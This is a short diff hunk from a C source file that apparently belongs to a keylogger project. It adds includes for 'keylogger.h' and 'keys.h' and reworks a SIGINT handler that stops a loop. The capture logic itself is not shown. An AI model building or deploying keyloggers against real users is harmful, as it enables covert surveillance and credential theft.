@@ -10,9 +10,14 @@
 /*                                                                            */
 /* ************************************************************************** */
 
-int						loop;
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
 
-void 					sigint(int sig)
+#include "keylogger.h"
+#include "keys.h"
+
+static void 		sigint(int sig)
 {
 	(void)sig;
 	loop = 0;
